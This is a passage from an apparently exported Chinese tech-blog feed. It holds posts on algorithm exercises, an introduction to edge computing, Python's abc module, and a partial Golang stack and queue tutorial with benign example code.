<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jumpFloorII</span><span class="params">(self, number)</span>:</span></div><div class="line">        <span class="keyword">if</span> number &lt;= <span class="number">2</span>:</div><div class="line">            <span class="keyword">return</span> number</div><div class="line">        <span class="keyword">return</span> <span class="number">2</span>**(number<span class="number">-1</span>)</div></pre></td></tr></table></figure>
<h4 id="矩形覆盖"><a href="#矩形覆盖" class="headerlink" title="矩形覆盖"></a>矩形覆盖</h4><h5 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　我们可以用2*1的小矩形横着或者竖着去覆盖更大的矩形。请问用n个2*1的小矩形无重叠地覆盖一个2*n的大矩形，总共有多少种方法？</p>
<h5 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">自己画个图模拟一下：</div><div class="line">n   结果</div><div class="line">1    1</div><div class="line">2    2</div><div class="line">3    3</div><div class="line">4    5</div><div class="line">......</div><div class="line">F(n)=F(n-1)+F(n-2)</div><div class="line">很显然，又是斐波那契数列。</div></pre></td></tr></table></figure>
<p>　　代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rectCover</span><span class="params">(self, number)</span>:</span></div><div class="line">        <span class="keyword">if</span> number &lt;= <span class="number">1</span>:</div><div class="line">            <span class="keyword">return</span> number</div><div class="line">        res = <span class="number">1</span></div><div class="line">        pre = <span class="number">1</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, number+<span class="number">1</span>):</div><div class="line">            res = res + pre</div><div class="line">            pre = res - pre</div><div class="line">        <span class="keyword">return</span> res</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Algorithm</tag>
        <tag>剑指offer</tag>
      </tags>
  </entry>
  <entry>
    <title>边缘计算系列-边缘计算是什么？</title>
    <url>/2019/07/06/%E8%BE%B9%E7%BC%98%E8%AE%A1%E7%AE%97%E7%B3%BB%E5%88%97-%E8%BE%B9%E7%BC%98%E8%AE%A1%E7%AE%97%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/</url>
    <content><![CDATA[<p><center>在实习的公司做了一次关于边缘计算的分享，查阅了很多资料，总结、整理的东西都将在这个系列的博客中分享出来。</center><br><a id="more"></a></p>
<h4 id="边缘计算是什么？"><a href="#边缘计算是什么？" class="headerlink" title="边缘计算是什么？"></a>边缘计算是什么？</h4><p>　　天下大势，分久必合，合久必分。从原来的集中式大型计算机到 C/S 结构的网络计算、个人 PC 计算，从 C/S、 PC 计算到资源集中的云计算、再到目前更加分散的智能、边缘终端计算。</p>
<p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/7/6-1.png" alt="6-1"></p>
<p>　　在边缘计算的早期提出者-美国韦恩州立大学施巍松教授的论文中是这么定义边缘计算的：边缘计算是指在网络边缘执行计算的一种新型计算模型，边缘计算操作的对象包括来自于云服务的下行数据和来自于万物互联服务的上行数据，而边缘计算的边缘是指从数据源到云计算中心路径之间的任意计算和网络资源，是一个连续统。</p>
<p>　　此外，还有很多组织或文献中也给出了定义，例如：</p>
<ul>
<li><strong>维基百科</strong>：边缘计算是一种优化云计算系统的方法。在边缘执行分析和知识生成减少受控系统和数据中心之间的通信带宽。</li>
<li><strong>边缘计算产业联盟</strong>：边缘计算是在靠近物或数据源头的网络边缘侧，融合网络、计算、存储、应用核心能力的分布式开放平台，就近提供边缘智能服务，满足行业数字化在敏捷联接、实时业务、数据优化、应用智能、安全与隐私保护等方面的关键需求。</li>
<li><strong>OpenStack基金会</strong>：边缘计算是为应用开发者和服务提供商在网络的边缘侧提供云服务和IT环境服务。边缘计算的目标是在靠近数据输入或用户的地方提供计算、存储和网络带宽。</li>
</ul>
<p>　　上面都是比较官方或者比较学术的定义，很多人表示看不懂啊。那么，接下来，说人话。上次在知乎上看到一个十分形象的比喻：</p>
<p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/7/6-2.png" alt="6-2"></p>
<ul>
<li>不管三七二十一，把垃圾拉到垃圾场集中处理，叫云计算。</li>
<li>将垃圾在垃圾桶侧、垃圾车、垃圾站处理，叫雾计算。</li>
<li>每户上海市民自己进行分拣处理垃圾，叫边缘计算。</li>
</ul>
<p>　　边缘计算的概念其实很大，可以涵盖很多的内容。广义的边缘只强调功能，只要提供本地计算、存储即可，而 IT 视角下的边缘计算要求编程模型与云计算一致，这样服务可以在云上验证，动态部署到各个边缘，或者说他提供的服务是受控于云的。</p>
<h4 id="为什么需要边缘计算？"><a href="#为什么需要边缘计算？" class="headerlink" title="为什么需要边缘计算？"></a>为什么需要边缘计算？</h4><p>　　大家都知道，这些年，云计算得到了充分地发展，各种数据中心拔地而起。应用上云、服务上云，各种云化，云计算已经深入到我们的生活中，所有使用的互联网产品基本上都可以见到云计算的影子。但是，随着物联网时代的到来，更多新的需求出现，这也就给云计算带来了新的挑战，比如：</p>
<ul>
<li><strong>网络带宽不足。</strong>物联网时代，数据量激增，网络带宽正在逐渐成为云计算的一大瓶颈。未经处理的数据中可能包含大量的静态画面、空闲状态等冗余数据，极大地降低了网络带宽的利用率。</li>
<li><strong>实时性不够。</strong>传统云计算模型下，应用将数据传送到云计算中心，再请求数据处理结果，增大了系统延迟。无人驾驶中需要毫秒级的反应时间，一旦由于网络问题而加大系统延迟，将会造成严重后果。</li>
<li><strong>不利于安全与隐私保护。</strong>传统云计算模式将用户的隐私数据传输到数据中心集中保存，传输、存储和使用路径过长，不但涉嫌将大量云端应用无关的用户隐私数据泄露给第三方，还存在黑客攻击、数据丢失等其他隐私风险。</li>
</ul>
<h4 id="边缘计算能带来什么？"><a href="#边缘计算能带来什么？" class="headerlink" title="边缘计算能带来什么？"></a>边缘计算能带来什么？</h4><p>　　如果说“云计算”所能实现的是大而全的话，那么“边缘计算”更多则是“小而美”，从数据源头入手，以“实时、快捷”的方式完成与“云计算”的应用互补。</p>
<p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/7/6-3.gif" alt="6-3"></p>
<p>　　针对云计算环境下面临的新需求和挑战，边缘计算主要可以带来以下好处：</p>
<ul>
<li><strong>更低的带宽消耗。</strong>在网络边缘处理大量临时数据，不再全部上传云端，这极大的减轻了网络带宽和数据中心功耗的压力。</li>
<li><strong>更好的实时性。</strong>在靠近数据生产者处做数据处理，不需要通过网络请求云计算中心的响应， 大大减少了系统延迟，增强了服务响应能力。</li>
<li><strong>更安全。</strong>边缘计算不再将用户隐私数据上传，而是存储在网络边缘设备上，减少了网络数据泄露的风险，保护了用户数据安全和隐私。</li>
</ul>
<p>　　总结起来，从“云”，到“雾”，再到“边缘”，旨在缩短数据的传输距离，节省带宽和降低服务延迟，保护用户的隐私与安全，最终提升应用和服务的性能和可靠性，并降低运行成本。</p>
<h4 id="你可能会问的"><a href="#你可能会问的" class="headerlink" title="你可能会问的"></a>你可能会问的</h4><h5 id="边缘计算会替代云计算吗？"><a href="#边缘计算会替代云计算吗？" class="headerlink" title="边缘计算会替代云计算吗？"></a>边缘计算会替代云计算吗？</h5><p>　　搜索边缘计算关键词我们经常可以看到各种标题党新闻，比如”边缘计算取代云计算“，”云计算会被边缘计算颠覆吗？“等等。其实，边缘计算只是云计算的补充，用来解决云计算面临的一些新的需求与挑战。云边端协同才是物联网时代正确的路子，这也是现在很多企业在做的事情。</p>
<h5 id="边缘计算与-CDN-的区别是什么？"><a href="#边缘计算与-CDN-的区别是什么？" class="headerlink" title="边缘计算与 CDN 的区别是什么？"></a>边缘计算与 CDN 的区别是什么？</h5><p>　　一方面，CDN（内容分发网络） 是内容的缓存，客户端去取缓存在 CDN 节点的内容，而边缘计算可以看作是计算的缓存，使得计算更靠近用户。另一方面，CDN 节点一般都是中小型的机房，但是边缘计算覆盖面更广，它可以是更小的设备，比如基站、家庭网关等等。</p>
<h5 id="边缘计算与分布式计算的区别是什么？"><a href="#边缘计算与分布式计算的区别是什么？" class="headerlink" title="边缘计算与分布式计算的区别是什么？"></a>边缘计算与分布式计算的区别是什么？</h5><p>　　边缘计算也是分布式计算，但又不全是分布式。像Hadoop这样的分布式计算框架，强调的是把计算任务分解到不同的节点去计算，主要还是用来处理大量数据的计算问题。而边缘计算更多的是解决云计算存在的带宽消耗、延迟大等问题。此外，现有的很多边缘计算方案其实都强调云边端协同，还是把它当作云计算的补充，因此还是有一些集中式的特点。</p>
<h5 id="边缘计算有未来吗？"><a href="#边缘计算有未来吗？" class="headerlink" title="边缘计算有未来吗？"></a>边缘计算有未来吗？</h5><p>　　不管学术界还是产业界，其实还是有蛮多人质疑边缘计算的，觉得这不是就是一个新的词嘛，还是没有解决一些核心的问题，也不是颠覆性的技术。个人认为边缘计算已经不再边缘，随着学术界和产业界的不断推动，边缘计算的定义会更加清晰，更多的应用得以落地以后会发展得更好，我们拭目以待吧。</p>
<p><strong>参考文献</strong>：</p>
<p>[1] 洪学海, 汪洋, 郭树盛. 边缘计算技术研究报告. <a href="http://www.cnic.cas.cn/xwdt/yfdt/201811/P020181108393346075254.pdf" target="_blank" rel="external">http://www.cnic.cas.cn/xwdt/yfdt/201811/P020181108393346075254.pdf</a></p>
<p>[2] Shi W, Cao J, Zhang Q, et al. <a href="https://ieeexplore.ieee.org/abstract/document/7488250" target="_blank" rel="external">Edge computing: Vision and challenges</a>[J]. IEEE Internet of Things Journal, 2016, 3(5): 637-646.</p>
<p>[3] 施巍松,张星洲,王一帆,张庆阳.<a href="http://crad.ict.ac.cn/CN/abstract/abstract3851.shtml" target="_blank" rel="external">边缘计算</a><a href="http://crad.ict.ac.cn/CN/abstract/abstract3851.shtml" target="_blank" rel="external">:</a><a href="http://crad.ict.ac.cn/CN/abstract/abstract3851.shtml" target="_blank" rel="external">现状与展望</a>[J].计算机研究与发展,2019,56(01):69-89.</p>
<p>[4] 边缘计算产业联盟. <a href="http://www.ecconsortium.org/Uploads/file/20190221/1550718911180625.pdf" target="_blank" rel="external">边缘计算与云计算协同白皮书（</a><a href="http://www.ecconsortium.org/Uploads/file/20190221/1550718911180625.pdf" target="_blank" rel="external">2018</a><a href="http://www.ecconsortium.org/Uploads/file/20190221/1550718911180625.pdf" target="_blank" rel="external">年）</a>， <a href="http://www.ecconsortium.org/Uploads/file/20190225/1551059767474697.pdf" target="_blank" rel="external">边缘计算参考架构</a><a href="http://www.ecconsortium.org/Uploads/file/20190225/1551059767474697.pdf" target="_blank" rel="external">3.0</a><a href="http://www.ecconsortium.org/Uploads/file/20190225/1551059767474697.pdf" target="_blank" rel="external">（</a><a href="http://www.ecconsortium.org/Uploads/file/20190225/1551059767474697.pdf" target="_blank" rel="external">2018</a><a href="http://www.ecconsortium.org/Uploads/file/20190225/1551059767474697.pdf" target="_blank" rel="external">年）</a></p>
]]></content>
      <categories>
        <category>Cloud/Edge Computing</category>
      </categories>
      <tags>
        <tag>边缘计算</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 抽象基类 ABC 模块</title>
    <url>/2019/07/01/Python-%E6%8A%BD%E8%B1%A1%E5%9F%BA%E7%B1%BB-ABC-%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<center>Python 抽象基类 ABC 模块学习与总结。</center>

<a id="more"></a>
<h4 id="抽象基类"><a href="#抽象基类" class="headerlink" title="抽象基类"></a>抽象基类</h4><p>　　抽象基类主要用于接口设计，而后续的其他类可以覆盖该接口。抽象基类有两个特点：</p>
<ul>
<li>规定继承类必须具有抽象基类指定的方法。</li>
<li>抽象基类无法实例化。</li>
</ul>
<p>　　抽象基类提供了逻辑和实现解耦的能力，即在不同的模块中通过抽象基类来调用，可以用最精简的方式展示出代码之间的逻辑关系，让模块之间的依赖清晰简单。同时，一个抽象类可以有多个实现，让系统的运转更加灵活。而针对抽象类的编程，让每个人可以关注当前抽象类，只关注其方法和描述，而不需要考虑过多的其他逻辑，这对协同开发有很大意义。极简版的抽象类实现，也让代码可读性更高。</p>
<h4 id="abc-模块"><a href="#abc-模块" class="headerlink" title="abc 模块"></a>abc 模块</h4><p>　　abc 模块是 AbsructBaseClass 的缩写，该模块提供了在 Python 中定义抽象基类的组件。该模块提供了一个元类 ABCMeta，可以用来定义抽象类，另外还提供一个工具类 ABC，可以用它以继承的方式定义抽象基类。抽象基类如果想要声明“抽象方法”，可以使用 <code>@abstractmethod</code>，如果想声明“抽象属性”，可以使用<code>@abstractproperty</code>。<strong>抽象基类的使用</strong>：</p>
<h5 id="直接继承"><a href="#直接继承" class="headerlink" title="直接继承"></a>直接继承</h5><p>　　直接继承抽象基类的子类就没有这么灵活，抽象基类中可以声明”抽象方法“和“抽象属性”，只有完全覆写（实现）了抽象基类中的“抽象”内容后，才能被实例化，而虚拟子类则不受此影响。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span><span class="params">(metaclass=ABCMeta)</span>:</span></div><div class="line"><span class="meta">    @abc.abstractmethod</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_name</span><span class="params">(self, key)</span>:</span></div><div class="line">        <span class="keyword">raise</span> NotImplementedError</div><div class="line"></div><div class="line"><span class="meta">    @abc.abstractmethod</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_name</span><span class="params">(self, kye, value)</span>:</span></div><div class="line">        <span class="keyword">raise</span> NotImplementedError</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span><span class="params">(Person)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_name</span><span class="params">(self, key)</span>:</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_name</span><span class="params">(self, kye, value)</span>:</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line">    </div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span><span class="params">(Person)</span>:</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line">p = Person()</div><div class="line">s = Student()</div><div class="line">t = Teacher()</div><div class="line">print(<span class="string">'Subclass:'</span>, issubclass(Student, Person))</div><div class="line">print(<span class="string">'Instance:'</span>, isinstance(Student(), Person))</div></pre></td></tr></table></figure>
<p>　　抽象基类的一个主要用途是在代码中检查某些类是否为特定类型，实现了特定接口</p>
<h5 id="虚拟子类"><a href="#虚拟子类" class="headerlink" title="虚拟子类"></a>虚拟子类</h5><p>　　将其他的类”注册“到抽象基类下当虚拟子类（调用 register 方法），虚拟子类的好处是你实现的第三方子类不需要直接继承自基类，可以实现抽象基类中的部分 API 接口，也可以根本不实现，但是 <code>issubclass()</code>， <code>issubinstance()</code> 进行判断时仍然返回真值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span><span class="params">(metaclass=ABCMeta)</span>:</span></div><div class="line"><span class="meta">    @abc.abstractmethod</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_name</span><span class="params">(self, key)</span>:</span></div><div class="line">        <span class="keyword">raise</span> NotImplementedError</div><div class="line"></div><div class="line"><span class="meta">    @abc.abstractmethod</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_name</span><span class="params">(self, kye, value)</span>:</span></div><div class="line">        <span class="keyword">raise</span> NotImplementedError</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span><span class="params">(Person)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_name</span><span class="params">(self, key)</span>:</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_name</span><span class="params">(self, kye, value)</span>:</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line">        </div><div class="line">Person.register(Student)</div><div class="line">print(<span class="string">'Subclass:'</span>, issubclass(Student, Person))</div><div class="line">print(<span class="string">'Instance:'</span>, isinstance(Student(), Person))</div></pre></td></tr></table></figure>
<p>　　在抽象类中抽象方法也可以提供通用的逻辑实现，这样具体类中就可以通过调用super()重用抽象方法的实现：</p>
<h4 id="collections-abc-模块"><a href="#collections-abc-模块" class="headerlink" title="collections.abc 模块"></a>collections.abc 模块</h4><p>　　collections.abc 模块收集了常用的抽象基类，可用于测试类是否提供特定接口：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">__all__ = [<span class="string">"Awaitable"</span>, <span class="string">"Coroutine"</span>,</div><div class="line">           <span class="string">"AsyncIterable"</span>, <span class="string">"AsyncIterator"</span>, <span class="string">"AsyncGenerator"</span>,</div><div class="line">           <span class="string">"Hashable"</span>, <span class="string">"Iterable"</span>, <span class="string">"Iterator"</span>, <span class="string">"Generator"</span>, <span class="string">"Reversible"</span>,</div><div class="line">           <span class="string">"Sized"</span>, <span class="string">"Container"</span>, <span class="string">"Callable"</span>, <span class="string">"Collection"</span>,</div><div class="line">           <span class="string">"Set"</span>, <span class="string">"MutableSet"</span>,</div><div class="line">           <span class="string">"Mapping"</span>, <span class="string">"MutableMapping"</span>,</div><div class="line">           <span class="string">"MappingView"</span>, <span class="string">"KeysView"</span>, <span class="string">"ItemsView"</span>, <span class="string">"ValuesView"</span>,</div><div class="line">           <span class="string">"Sequence"</span>, <span class="string">"MutableSequence"</span>,</div><div class="line">           <span class="string">"ByteString"</span>,</div><div class="line">           ]</div></pre></td></tr></table></figure>
<p>　　例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">size = <span class="keyword">None</span></div><div class="line"><span class="keyword">if</span> isinstance(myvar, collections.abc.Sized):</div><div class="line">    size = len(myvar)</div></pre></td></tr></table></figure>
<p>　　查看 Sized 源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sized</span><span class="params">(metaclass=ABCMeta)</span>:</span></div><div class="line"></div><div class="line">    __slots__ = ()</div><div class="line"></div><div class="line"><span class="meta">    @abstractmethod</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__len__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> <span class="number">0</span></div><div class="line"></div><div class="line"><span class="meta">    @classmethod</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__subclasshook__</span><span class="params">(cls, C)</span>:</span></div><div class="line">        <span class="keyword">if</span> cls <span class="keyword">is</span> Sized:</div><div class="line">            <span class="keyword">return</span> _check_methods(C, <span class="string">"__len__"</span>)</div><div class="line">        <span class="keyword">return</span> <span class="built_in">NotImplemented</span></div></pre></td></tr></table></figure>
<p>　　Sized类改写了 <code>__subclasshook__</code> 魔法方法，使其可以通过 <code>isinstance()</code> 判断对象是否含有 <code>__len__</code> 方法。</p>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 笔记-栈和队列</title>
    <url>/2019/06/27/Golang-%E7%AC%94%E8%AE%B0-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<p><center>Golang 栈和队列实现复习与总结</center><br><a id="more"></a></p>
<h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><p>　　栈是一种只能从表的一端存取数据且遵循”先进后出“原则的线性存储结构。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">package</span> stack</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"sync"</span></div><div class="line">	<span class="string">"errors"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="keyword">type</span> item <span class="keyword">interface</span>&#123;&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> Stack <span class="keyword">struct</span> &#123;</div><div class="line">	items []item</div><div class="line">	lock  sync.Mutex</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 创建栈</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(stack *Stack)</span> <span class="title">New</span><span class="params">()</span> *<span class="title">Stack</span></span> &#123;</div><div class="line">	stack.items = []item&#123;&#125;</div><div class="line">	<span class="keyword">return</span> stack</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="入栈"><a href="#入栈" class="headerlink" title="入栈"></a>入栈</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="comment">// 入栈</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(stack *Stack)</span> <span class="title">Push</span><span class="params">(t item)</span></span> &#123;</div><div class="line">	stack.lock.Lock()</div><div class="line">	<span class="keyword">defer</span> stack.lock.Unlock()</div><div class="line"></div><div class="line">	stack.items = <span class="built_in">append</span>(stack.items, t)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="出栈"><a href="#出栈" class="headerlink" title="出栈"></a>出栈</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="comment">// 出栈</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(stack *Stack)</span> <span class="title">Pop</span><span class="params">()</span> <span class="params">(<span class="keyword">interface</span>&#123;&#125;, error)</span></span> &#123;</div><div class="line">	stack.lock.Lock()</div><div class="line">	<span class="keyword">defer</span> stack.lock.Unlock()</div><div class="line"></div><div class="line">	<span class="keyword">if</span> stack.IsEmpty() &#123;</div><div class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">"stack is Empty"</span>)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	t := stack.items[<span class="built_in">len</span>(stack.items)<span class="number">-1</span>]</div><div class="line">	stack.items = stack.items[:<span class="built_in">len</span>(stack.items)<span class="number">-1</span> ]</div><div class="line">	<span class="keyword">return</span> t, <span class="literal">nil</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="栈大小"><a href="#栈大小" class="headerlink" title="栈大小"></a>栈大小</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="comment">// 栈大小</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(stack *Stack)</span> <span class="title">Size</span><span class="params">()</span> <span class="title">int</span></span> &#123;</div><div class="line">	stack.lock.Lock()</div><div class="line">	<span class="keyword">defer</span> stack.lock.Unlock()</div><div class="line"></div><div class="line">	<span class="keyword">return</span> <span class="built_in">len</span>(stack.items)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="判断栈空"><a href="#判断栈空" class="headerlink" title="判断栈空"></a>判断栈空</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="comment">// 判断栈空</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(stack *Stack)</span> <span class="title">IsEmpty</span><span class="params">()</span> <span class="title">bool</span></span>  &#123;</div><div class="line">	<span class="keyword">return</span> <span class="built_in">len</span>(stack.items) == <span class="number">0</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　注意：这里不能再加锁。因为其他方法中有调用这个方法，会导致未解锁时进行加锁，出现死锁的情况。</p>
<h5 id="取栈顶元素"><a href="#取栈顶元素" class="headerlink" title="取栈顶元素"></a>取栈顶元素</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="comment">// 取栈顶元素</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(stack *Stack)</span><span class="title">Top</span><span class="params">()</span> <span class="params">(<span class="keyword">interface</span>&#123;&#125;, error)</span></span> &#123;</div><div class="line">	stack.lock.Lock()</div><div class="line">	<span class="keyword">defer</span> stack.lock.Unlock()</div><div class="line"></div><div class="line">	<span class="keyword">if</span> stack.IsEmpty() &#123;</div><div class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">"stack is Empty"</span>)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	t := stack.items[<span class="built_in">len</span>(stack.items)<span class="number">-1</span>]</div><div class="line">	<span class="keyword">return</span> t, <span class="literal">nil</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="清空栈"><a href="#清空栈" class="headerlink" title="清空栈"></a>清空栈</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="comment">// 清空栈</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(stack *Stack)</span><span class="title">Clear</span><span class="params">()</span> <span class="params">(<span class="keyword">bool</span>, error)</span></span>&#123;</div><div class="line">	stack.lock.Lock()</div><div class="line">	<span class="keyword">defer</span> stack.lock.Unlock()</div><div class="line"></div><div class="line">	<span class="keyword">if</span> stack.IsEmpty() &#123;</div><div class="line">		<span class="keyword">return</span> <span class="literal">false</span>, errors.New(<span class="string">"queue is empty"</span>)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	stack.items = <span class="literal">nil</span></div><div class="line">	<span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="打印栈中元素"><a href="#打印栈中元素" class="headerlink" title="打印栈中元素"></a>打印栈中元素</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="comment">// 从栈低-&gt;栈顶</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(stack *Stack)</span><span class="title">Print</span><span class="params">()</span></span>  &#123;</div><div class="line">	stack.lock.Lock()</div><div class="line">	<span class="keyword">defer</span> stack.lock.Unlock()</div><div class="line"></div><div class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> stack.items&#123;</div><div class="line">		fmt.Print(v, <span class="string">" "</span>)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	fmt.Println()</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">    <span class="string">"fmt"</span></div><div class="line">    <span class="string">"stack"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">    <span class="keyword">var</span> s stack.Stack</div><div class="line">    s.New()</div><div class="line"></div><div class="line">    s.Push(<span class="number">1</span>)</div><div class="line">    s.Push(<span class="number">2</span>)</div><div class="line">    s.Push(<span class="number">3</span>)</div><div class="line"></div><div class="line">    s.Print()</div><div class="line"></div><div class="line">    fmt.Println(s.Size())</div><div class="line"></div><div class="line">    v, err := s.Top()</div><div class="line">    fmt.Println(v, err)</div><div class="line"></div><div class="line">    v, err = s.Pop()</div><div class="line">    fmt.Println(v, err)</div><div class="line"></div><div class="line">    s.Clear()</div><div class="line"></div><div class="line">    fmt.Println(s.IsEmpty())</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">1 2 3 </div><div class="line">3</div><div class="line">3 &lt;nil&gt;</div><div class="line">3 &lt;nil&gt;</div><div class="line">true</div></pre></td></tr></table></figure>
<h4 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h4><p>　　队列只允许在一端进行插入操作、而在另一端进行删除操作的线性表，它是一种先进先出的数据结构，</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">package</span> queue</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">    <span class="string">"sync"</span></div><div class="line">    <span class="string">"errors"</span></div><div class="line">    <span class="string">"fmt"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="comment">// 队列元素</span></div><div class="line"><span class="keyword">type</span> item <span class="keyword">interface</span>&#123;&#125;</div><div class="line"></div><div class="line"><span class="comment">// 定义队列</span></div><div class="line"><span class="keyword">type</span> Queue <span class="keyword">struct</span> &#123;</div><div class="line">    items []item</div><div class="line">    lock  sync.Mutex</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 创建队列</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(queue *Queue)</span> <span class="title">New</span><span class="params">()</span> *<span class="title">Queue</span></span> &#123;</div><div class="line">    queue.items = []item&#123;&#125;</div><div class="line">    <span class="keyword">return</span> queue</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="入队"><a href="#入队" class="headerlink" title="入队"></a>入队</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="comment">// 入队</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(queue *Queue)</span> <span class="title">EnQueue</span><span class="params">(e item)</span></span> &#123;</div><div class="line">    queue.lock.Lock()</div><div class="line">    <span class="keyword">defer</span> queue.lock.Unlock()</div><div class="line"></div><div class="line">    queue.items = <span class="built_in">append</span>(queue.items, e)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
